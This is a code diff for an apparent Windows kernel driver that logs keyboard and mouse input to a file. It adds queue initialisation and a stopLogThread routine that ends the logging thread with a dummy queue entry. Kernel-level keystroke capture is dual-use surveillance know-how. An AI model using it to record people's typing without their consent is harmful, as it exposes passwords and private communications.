@@ -23,6 +23,15 @@ static NTSTATUS logKbdToFile(PLIST_ENTRY pKbdListEntry, HANDLE hFile);
 static NTSTATUS logMouToFile(PLIST_ENTRY pMouListEntry, HANDLE hFile);
 
 NTSTATUS startLogThread(PDRIVER_OBJECT pDriverObject, LogType type) {
+
+	if (pLogThreads[type]) {
+		DBG_PRINTF("startLogThread: Thread %d still referenced\n", type);
+
+		return STATUS_THREAD_ALREADY_IN_SESSION;
+	}
+
+	initBlockingQueue(&inputQueues[type], 0x10);
+
 	HANDLE hLogThread = NULL;
 	OBJECT_ATTRIBUTES threadAttributes = { 0 };
 	InitializeObjectAttributes(&threadAttributes, NULL, 0, NULL, NULL);
@@ -50,22 +59,7 @@ NTSTATUS startLogThread(PDRIVER_OBJECT pDriverObject, LogType type) {
 		break;
 	}
 
-	NTSTATUS ntStatus = STATUS_SUCCESS;
-
-	if (pLogThreads[type]) {
-		ntStatus = KeWaitForSingleObject(pLogThreads[type], Executive, KernelMode, FALSE, NULL);
-
-		if (!NT_SUCCESS(ntStatus)) {
-			DBG_PRINTF("startLogThread: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);
-
-			return ntStatus;
-		}
-
-		ObfDereferenceObject(pLogThreads[type]);
-		pLogThreads[type] = NULL;
-	}
-
-	ntStatus = IoCreateSystemThread(pDriverObject, &hLogThread, DELETE | SYNCHRONIZE, &threadAttributes, NULL, NULL, logStartRoutine, pLogThreadData);
+	NTSTATUS ntStatus = IoCreateSystemThread(pDriverObject, &hLogThread, DELETE | SYNCHRONIZE, &threadAttributes, NULL, NULL, logStartRoutine, pLogThreadData);
 
 	if (!NT_SUCCESS(ntStatus)) {
 		DBG_PRINTF("startLogThread: IoCreateSystemThread failed: 0x%lx\n", ntStatus);
@@ -84,6 +78,77 @@ NTSTATUS startLogThread(PDRIVER_OBJECT pDriverObject, LogType type) {
 	if (!NT_SUCCESS(ntStatus)) {
 		DBG_PRINTF("startLogThread: ZwClose failed: 0x%lx\n", ntStatus);
 	}
+
+	return ntStatus;
+}
+
+
+NTSTATUS stopLogThread(LogType type) {
+
+	if (!pLogThreads[type]) {
+		DBG_PRINTF("stopLogThread: Thread %d not referenced\n", type);
+
+		return STATUS_THREAD_NOT_IN_SESSION;
+	}
+
+	inputQueues[type].isWaiting = FALSE;
+	NTSTATUS ntStatus = STATUS_SUCCESS;
+
+	if (type == LOG_KBD) {
+		KbdDataEntry* const pKbdDataDummyEntry = (KbdDataEntry*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KbdDataEntry), KBD_LIST_DATA_TAG);
+
+		if (!pKbdDataDummyEntry) {
+			DBG_PRINT("stopLogThread: ExAllocatePool2 failed\n");
+
+			return STATUS_MEMORY_NOT_ALLOCATED;
+		}
+
+		// KEY_BREAK will not be logged to the log file
+		pKbdDataDummyEntry->data.Flags = KEY_BREAK;
+		// adding the dummy struct will make the thread close the file because queue is not waiting anymore
+		ntStatus = addToBlockigQueue(&inputQueues[LOG_KBD], &pKbdDataDummyEntry->list);
+
+		if (ntStatus != STATUS_SUCCESS) {
+			DBG_PRINTF("stopLogThread: addBlockigQueue failed: 0x%lx\n", ntStatus);
+			
+			ExFreePoolWithTag(pKbdDataDummyEntry, KBD_LIST_DATA_TAG);
+
+			return ntStatus;
+		}
+
+	}
+	else if (type == LOG_MOU) {
+		MouDataEntry* const pMouDataDummyEntry = (MouDataEntry*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MouDataEntry), KBD_LIST_DATA_TAG);
+
+		if (!pMouDataDummyEntry) {
+			DBG_PRINT("stopLogThread: ExAllocatePool2 failed\n");
+
+			return STATUS_MEMORY_NOT_ALLOCATED;
+		}
+
+		// 0 will not be logged to the log file
+		pMouDataDummyEntry->data.ButtonFlags = 0;
+		// adding the dummy struct will make the thread close the file because queue is not waiting anymore
+		ntStatus = addToBlockigQueue(&inputQueues[LOG_MOU], &pMouDataDummyEntry->list);
+
+		if (ntStatus != STATUS_SUCCESS) {
+			DBG_PRINTF("stopLogThread: addBlockigQueue failed: 0x%lx\n", ntStatus);
+
+			ExFreePoolWithTag(pMouDataDummyEntry, KBD_LIST_DATA_TAG);
+
+			return ntStatus;
+		}
+
+	}
+
+	ntStatus = KeWaitForSingleObject(pLogThreads[type], Executive, KernelMode, FALSE, NULL);
+
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_PRINTF("stopLogThread: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);
+	}
+
+	ObfDereferenceObject(pLogThreads[type]);
+	pLogThreads[type] = NULL;
 
 	return ntStatus;
 }
